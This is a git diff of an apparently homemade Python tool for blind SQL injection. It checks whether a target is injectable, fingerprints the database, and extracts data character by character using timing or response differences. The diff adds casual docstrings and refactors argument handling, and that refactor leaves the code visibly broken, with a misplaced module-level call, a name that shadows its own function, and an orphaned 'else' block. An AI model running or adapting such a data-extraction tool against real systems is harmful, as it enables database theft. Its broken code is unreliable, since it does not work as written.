@@ -13,6 +13,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 ### Constants and Usage
 
 def usage():
+    
     usage = """
     BlindBrute - Blind SQL Injection Brute Forcer with Header, Data, and File Support
 
@@ -54,6 +55,7 @@ def usage():
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
 def queries():
+
     file_path = os.path.join(os.path.dirname(__file__), 'queries.json')
     try:
         with open(file_path, 'r') as file:
@@ -77,11 +79,16 @@ def max_workers(args):
         print(f"[-] Error determining max_workers: {e}. Defaulting to 8.")
         return 8
 
-max_workers = max_workers()
+max_workers = max_workers(args)
 
 ### Main Logic
 
 def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
+
+    """
+    checks if the database is even injectable using true and false conditions. also determines the detection method for later use. 
+    no need for threading, its 2 payloads. if this step fails, give up (or dont im not your dad).
+    """
     
     if args.sleep_only:
         return True, "sleep"
@@ -157,6 +164,15 @@ def is_injectable(request_template=None, injectable_headers={}, static_headers={
         return False, None
 
 def detect_database(detection, request_template=None, injectable_headers={}, static_headers={},  args=None):
+
+    """
+    attempts to determine what we're dealing with. detection happens in two stages because of the way the json is structured. 
+    in the case that the version query is used for multiple databases, a second batch of requests is sent to determine a more specific database.
+    this is not foolproof. many of the databases that use the same version queries also use the same sleep queries. the first positive ID will be the defacto database.
+    this isnt actually that big of a deal because if a databse uses identical version queries and sleep queries, the length queries are typically also identical.
+    the actual detection is handled in the detect helper function, and the actual requests are handled in the inject helper function.
+    just don't like, quote me on the database. my goal is to extract data, not provide you with the database. good enough is good enough.
+    """
     
     print("[*] Attempting to detect the database type...")
 
@@ -244,6 +260,13 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
 
 def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
 
+    """
+    to optimize the data extraction process, we need the length of the data. this function uses a binary search algorithm to narrow down the length of the data. 
+    the maximum length that this function will search for is determined by the user (hopefully) but defaults to 1000 if a length isn't provided.
+    why 1000 you ask? because its a nice round number and seemed like a decent catch all without affecting performance too terribly. change it if you like.
+    the requests and detection are handled within this function because i didnt think it needed a helper function ¯\_ (ツ)_/¯
+    """
+
     if not length_query or length_query == "N/A":
         print(f"[-] Length query not found for {db_name}. Skipping data length detection.")
         return db_name, substring_query, sleep_query, None
@@ -322,6 +345,12 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
         return db_name, substring_query, sleep_query, None
 
 def extract_data(table, column, where_clause, db_name, substring_query, sleep_query, length, position, extraction, request_template=None, injectable_headers={}, static_headers={}, args=None):
+
+    """
+    now we're cookin with gas. this function extracts data in a variety of ways, but the default behavior is a threaded charcter-by-character approach. 
+    if that doesnt tickle your fancy, you can provide a dictionary or use a binary search algorithm. the world is your oyster or something.
+    the detection is handled in the extract helper function, and the actual requests are handled in the inject helper function.
+    """
 
     print("[*] Attempting to extract data...")
 
@@ -470,7 +499,7 @@ def no_length():
 
 def one_third():
 
-    print("\n[*] A third or less of the data remains to be extracted. It is unlikely that the reamining data will be contained in the wordlist.")
+    print("\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
     print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
     
     i, _, _ = select.select([sys.stdin], [], [], 60)
@@ -552,6 +581,10 @@ def parse_request(file_content):
 
 def send_request(headers=None, body=None, method="GET", args=None):
 
+    """
+    sends the requests when a request template is provided, all http methods are supported.
+    """
+
     try:
         if method == "POST":
             response = requests.post(url=args.url, headers=headers, body=body, timeout=args.timeout)
@@ -599,6 +632,14 @@ def baseline_request(request_template, injectable_headers, static_headers, args)
 
 def inject(encoded_payload, request_template, injectable_headers, static_headers, args):
 
+    """
+    sends the requests if a request template is not provided. locked to GET and POST if you don't provide a request template.
+    this is where the actual injection happens. an encoded payload is attached to whatever field is desired. 
+    if a request template is provided, the placeholder in the template is overwritten and the request is passed to send_request.
+    all functions that involve sql injection rely on this function. it is reeeeeeaaaalllyyy important.
+    this fucntion also handles the delay between requests. 
+    """
+
     try:
         start_time = time.time()
 
@@ -635,6 +676,12 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
         return None, None
 
 def detect(encoded_payload, db_name, db_specific, sleep_query, detection, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
+
+    """
+    handles the detection for detect_database and provides the helper function, inject, with the encoded payload and request info.
+    no actual request is sent by this function. it relies on the helper fucntion, inject. 
+    this fucntion also finds the related queries of the database its currently handling and passes them along.
+    """
     
     substring_query = queries[db_name].get("subsubstring_query", None)
     length_function = queries[db_name].get("length_function", None)
@@ -681,6 +728,11 @@ def detect(encoded_payload, db_name, db_specific, sleep_query, detection, reques
 
 def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
     
+    """
+    not a whole lot going on here. this fucntion handles detection for extract_data, and provides the helper function, inject, with the encoded payload and request info.
+    no actual request is sent by this function. it relies on the helper fucntion, inject. 
+    """
+
     try:
         response, response_time = inject(
             encoded_payload=encoded_payload,
@@ -715,9 +767,11 @@ def extract(encoded_payload, value, extraction, request_template, injectable_hea
 
     return None
 
-### MAIN
+def args ():
 
-def main():
+    """
+    initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
+    """
 
     parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")
 
@@ -744,6 +798,7 @@ def main():
 
     args = parser.parse_args()
 
+    
     if len(sys.argv) == 1:
         usage()
         return
@@ -765,18 +820,27 @@ def main():
         return
     if args.sleep_only and args.sleep_only < 1:
         print("[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 3")
-    
+
+    return args
+
+### MAIN
+
+def main():
+
+    """
+    where all the magic happens
+    """
+
+    args = args()
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
     static_headers = dict(args.static_headers) if args.static_headers else {}
-
     request_template = None
+    detection = None
+
     if args.file:
         request_template = load_request(args.file)
         if not request_template:
             return
-
-    detection = None
-
     if args.force:
         if args.force == "keyword":
             if args.true_keywords or args.false_keywords:
@@ -789,7 +853,8 @@ def main():
         else:
             detection = args.force
         print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
-    else:
+    
+
     # Step 1: Check if the field is injectable
         injectable, detection = is_injectable(injectable_headers, static_headers, request_template, args=args)
         if not injectable:
@@ -847,6 +912,7 @@ def main():
         args=args
     )
 
+    # Step 5: Output the data
     if args.output_file:
         try:
             with open(args.output_file, 'w') as output_file:
